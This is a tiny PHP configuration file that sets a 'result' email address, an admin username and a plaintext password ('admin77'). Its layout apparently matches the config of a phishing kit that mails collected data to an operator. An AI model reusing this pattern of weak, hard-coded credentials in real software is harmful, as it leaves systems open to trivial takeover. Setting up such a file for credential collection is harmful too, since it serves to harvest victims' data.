<?php
//-----------Your Email
$result = "resultniod@gmail.com";

//-----------Your ADMINname
$name = "admin7";


//-----------Your Password
$pass_word = "admin77";
?>